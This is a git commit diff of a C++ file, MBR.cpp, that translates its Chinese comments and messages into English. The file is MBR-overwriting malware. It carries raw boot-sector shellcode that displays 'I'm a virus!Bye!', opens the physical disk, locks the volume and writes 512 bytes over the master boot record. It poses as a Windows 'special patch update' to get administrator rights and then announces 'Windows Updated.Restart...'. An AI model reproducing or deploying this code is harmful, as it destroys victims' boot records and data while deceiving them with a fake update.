8c39bd0ee28a269a7af22c0984cb39a5b64e6dba
tiantian520 <64673335+tiantian520tt@users.noreply.github.com>
2021-05-01 15:34:39 +0800

    Update MBR.cpp

--- MBR.cpp
+++ MBR.cpp
@@ -2,9 +2,9 @@
 #include<stdio.h>
 #include<iostream>
 using namespace std;
-unsigned char sco[] =////////////////16进制
+unsigned char sco[] =////////////////16
 "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
-"\x00\xBA\x1D\x0E\xCD\x10\xE2\xFE\x0D\x0A\x49\x27\x6D\x20\x61\x20\x76\x69\x72\x75\x73\x21\x42\x79\x65\x21";
+"\x00\xBA\x1D\x0E\xCD\x10\xE2\xFE\x0D\x0A\x49\x27\x6D\x20\x61\x20\x76\x69\x72\x75\x73\x21\x42\x79\x65\x21"; //"I'm a virus!Bye!"
 
 DWORD MBR()
 {
@@ -26,11 +26,11 @@ DWORD MBR()
 		NULL);
 	if (hDevice == INVALID_HANDLE_VALUE)
 	{
-		MessageBoxA(NULL, "错误", "请以管理员身份运行，否则 Windows 无法安装此特殊补丁更新。", MB_OK);
+		MessageBoxA(NULL, "Error", "Please run as an administrator, otherwise Windows cannot install this special patch update.", MB_OK);
 		return 0;
 	}
 	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
-	//写入磁盘文件   
+	//Write to disk file
 	WriteFile(hDevice, pMBR, 512, &Ropen, NULL);
 	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
 	cout<<"Windows Updated.Restart..."<<endl;
